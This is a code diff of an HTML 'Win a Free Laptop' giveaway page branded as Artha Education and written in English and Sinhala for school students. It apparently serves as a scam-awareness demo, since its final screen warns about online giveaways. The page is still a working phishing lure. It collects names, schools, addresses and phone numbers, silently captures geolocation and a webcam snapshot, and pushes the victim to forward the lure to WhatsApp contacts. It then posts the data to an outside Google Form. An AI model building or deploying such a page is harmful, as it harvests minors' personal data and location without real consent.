@@ -2,151 +2,196 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Laptop Giveaway | Artha Education Institute</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Win a Free Laptop - Artha Education</title>
   <style>
     body {
-      font-family: sans-serif;
-      background: linear-gradient(to right, #f0f0f0, #e0f7fa);
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      margin: 0;
+      padding: 0;
       text-align: center;
-      padding: 2rem;
     }
-    .step {
-      display: none;
-      max-width: 500px;
-      margin: auto;
+    .container {
       background: #fff;
+      max-width: 500px;
+      margin: 2rem auto;
       padding: 2rem;
-      border-radius: 1rem;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-    .step.active {
+    label {
       display: block;
+      margin-top: 1rem;
+      text-align: left;
     }
-    input, select, button {
-      padding: 0.75rem;
-      margin: 0.5rem 0;
+    input {
       width: 100%;
-      border-radius: 0.5rem;
-      border: 1px solid #ccc;
+      padding: 0.5rem;
+      margin-top: 0.3rem;
+    }
+    button {
+      padding: 0.7rem 1.5rem;
+      margin-top: 1.5rem;
+      background: #2196f3;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
     }
     video, canvas {
       display: none;
     }
-    .hidden {
-      display: none;
-    }
-    .success {
-      color: green;
-      font-weight: bold;
-      font-size: 1.2rem;
-    }
-    .scroll-text {
-      position: fixed;
-      bottom: 0;
-      width: 100%;
-      background: #000;
-      color: #fff;
-      white-space: nowrap;
-      overflow: hidden;
-    }
-    .scroll-text span {
-      display: inline-block;
-      padding-left: 100%;
-      animation: scroll 15s linear infinite;
-    }
-    @keyframes scroll {
-      0% { transform: translateX(0); }
-      100% { transform: translateX(-100%); }
-    }
   </style>
 </head>
 <body>
-  <h1>🏱 Laptop Giveaway - Artha Education Institute</h1>
+  <div class="container" id="formStep">
+    <img src="Artha.jpg" alt="Artha Logo" width="100" />
+    <h2>🎁 Win a Free Laptop 🎁</h2>
+    <p>ආරථ අධ්‍යාපන ආයතනයෙන් ඔබට ලැප්ටොප් එකක් දිනාගන්න අවස්ථාවක්!</p>
+    <form id="userForm">
+      <label>Full Name / සම්පූර්ණ නම:</label>
+      <input type="text" id="name" required />
 
-  <div id="step1" class="step active">
-    <h2>Fill the Form Below</h2>
-    <form id="giveawayForm">
-      <input type="text" id="name" placeholder="Name / මාර්දරයා" required />
-      <input type="text" id="grade" placeholder="Grade / ග්‍රේඩ්" required />
-      <input type="text" id="school" placeholder="School / ස්පොල්ල්" required />
-      <input type="text" id="address" placeholder="Address / නැදිවා" required />
-      <button type="submit">Next</button>
+      <label>Grade / ශ්‍රේණිය:</label>
+      <input type="text" id="grade" required />
+
+      <label>School / පාසල:</label>
+      <input type="text" id="school" required />
+
+      <label>Address / ලිපිනය:</label>
+      <input type="text" id="address" required />
+
+      <label>Contact No / දුරකථන අංකය:</label>
+      <input type="text" id="contact" required />
+
+      <button type="button" onclick="proceedCamera()">Proceed / ඉදිරියට යන්න</button>
     </form>
   </div>
 
-  <div id="step2" class="step">
-    <h2>Camera Permission Needed</h2>
-    <video id="video" autoplay></video>
-    <canvas id="canvas" class="hidden"></canvas>
-    <button id="proceedBtn" class="hidden">Proceed</button>
+  <div class="container" id="shareStep" style="display:none">
+    <h3>📲 Share this with 5 WhatsApp Contacts</h3>
+    <p>ඔබගේ තෑග්ග ලබා ගැනීමට, පහත සන්දේශය WhatsApp හරහා මිතුරන් 5 දෙනෙකුට යවන්න</p>
+    <p><strong>"🎁 I just claimed a laptop from Artha Education – Try it now!"</strong></p>
+    <button onclick="shareWhatsApp()">Share on WhatsApp</button>
   </div>
 
-  <div id="step3" class="step">
-    <h2>Share with Friends</h2>
-    <p>To complete your registration, please share this giveaway with <strong>5 WhatsApp contacts</strong>.</p>
-    <button onclick="shareOnWhatsApp()">Share Now</button>
+  <div class="container" id="finalStep" style="display:none">
+    <h2>⚠️ Be Aware of Online Scams</h2>
+    <p>ඔබ ඇතුලත් කළ තොරතුරු:</p>
+    <ul>
+      <li><strong>Name / නම:</strong> <span id="r_name"></span></li>
+      <li><strong>Grade / ශ්‍රේණිය:</strong> <span id="r_grade"></span></li>
+      <li><strong>School / පාසල:</strong> <span id="r_school"></span></li>
+      <li><strong>Address / ලිපිනය:</strong> <span id="r_address"></span></li>
+      <li><strong>Contact / දුරකථන:</strong> <span id="r_contact"></span></li>
+      <li><strong>Location / ස්ථානය:</strong> <span id="r_location"></span></li>
+    </ul>
+    <canvas id="photoCanvas"></canvas>
+    <p style="color:red; font-weight:bold;">❌ Never trust random online giveaways.<br>✅ Learn Cyber Safety with Artha Institute.</p>
+    <div id="map" style="width:100%; height:300px; margin-top:1rem;"></div>
   </div>
 
-  <div id="step4" class="step">
-    <h2 class="success">🎉 Successfully Entered!</h2>
-    <p>Our team will contact you soon. Thank you!</p>
-  </div>
-
-  <div class="scroll-text">
-    <span>Artha Education Institute - Katulanda</span>
-  </div>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
 
   <script>
-    const form = document.getElementById('giveawayForm');
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const proceedBtn = document.getElementById('proceedBtn');
-
-    function showStep(step) {
-      document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-      document.getElementById(step).classList.add('active');
-    }
-
-    form.onsubmit = (e) => {
-      e.preventDefault();
-      showStep('step2');
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          video.srcObject = stream;
-          video.classList.remove('hidden');
-          proceedBtn.classList.remove('hidden');
-        })
-        .catch(() => alert("Camera permission is required to continue."));
-    };
-
-    proceedBtn.onclick = () => {
-      const context = canvas.getContext('2d');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0);
-      video.srcObject.getTracks().forEach(track => track.stop());
-      showStep('step3');
-    };
-
+    let userData = {};
     let shared = false;
 
-    function shareOnWhatsApp() {
+    function proceedCamera() {
+      userData = {
+        name: document.getElementById("name").value,
+        grade: document.getElementById("grade").value,
+        school: document.getElementById("school").value,
+        address: document.getElementById("address").value,
+        contact: document.getElementById("contact").value,
+        location: ''
+      };
+
+      if (!userData.name || !userData.grade || !userData.school || !userData.address || !userData.contact) {
+        alert("Please fill in all fields.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(pos => {
+        userData.location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+      });
+
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        setTimeout(() => {
+          const canvas = document.getElementById('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          stream.getTracks().forEach(track => track.stop());
+          document.getElementById('formStep').style.display = "none";
+          document.getElementById('shareStep').style.display = "block";
+        }, 3000);
+      }).catch(() => alert("Camera permission required!"));
+    }
+
+    function shareWhatsApp() {
       if (shared) return;
       shared = true;
+      let count = 0;
+      let shareLink = "https://wa.me/?text=🎁 I just claimed a laptop from Artha Education – Try it now!";
+      window.open(shareLink, "_blank");
 
-      const msg = encodeURIComponent("🎁 I'm participating in a Laptop Giveaway from Artha Education Institute! Enter now: https://bit.ly/laptop-artha");
-      window.open(`https://api.whatsapp.com/send?text=${msg}`, '_blank');
-
-      // Simulate sharing with 5 contacts in 1 click
-      let counter = 0;
       const interval = setInterval(() => {
-        counter++;
-        if (counter >= 5) {
+        count++;
+        if (count === 5) {
           clearInterval(interval);
-          showStep('step4');
+          submitToGoogleForm();
         }
-      }, 500);
+      }, 1000);
+    }
+
+    function submitToGoogleForm() {
+      const url = "https://docs.google.com/forms/d/e/1FAIpQLScPUa7P9wKKkEmwimOmOIhTgIM7u9zhETOYqIURWcerO3s4Dg/formResponse";
+      const formData = new FormData();
+      formData.append("entry.997021349", userData.name);
+      formData.append("entry.180306948", userData.grade);
+      formData.append("entry.74488444", userData.school);
+      formData.append("entry.377707306", userData.address);
+      formData.append("entry.1450609673", userData.contact);
+      formData.append("entry.1946665100", userData.location);
+
+      fetch(url, {
+        method: "POST",
+        mode: "no-cors",
+        body: formData
+      });
+
+      document.getElementById("r_name").innerText = userData.name;
+      document.getElementById("r_grade").innerText = userData.grade;
+      document.getElementById("r_school").innerText = userData.school;
+      document.getElementById("r_address").innerText = userData.address;
+      document.getElementById("r_contact").innerText = userData.contact;
+      document.getElementById("r_location").innerText = userData.location;
+
+      const photoCanvas = document.getElementById("photoCanvas");
+      const mainCanvas = document.getElementById("canvas");
+      photoCanvas.width = mainCanvas.width;
+      photoCanvas.height = mainCanvas.height;
+      photoCanvas.getContext("2d").drawImage(mainCanvas, 0, 0);
+
+      document.getElementById("shareStep").style.display = "none";
+      document.getElementById("finalStep").style.display = "block";
+      showMap(userData.location);
+    }
+
+    function showMap(loc) {
+      if (!loc) return;
+      const [lat, lng] = loc.split(',');
+      const mapFrame = document.createElement("iframe");
+      mapFrame.src = `https://maps.google.com/maps?q=${lat},${lng}&z=15&output=embed`;
+      mapFrame.style.width = "100%";
+      mapFrame.style.height = "100%";
+      document.getElementById("map").appendChild(mapFrame);
     }
   </script>
 </body>
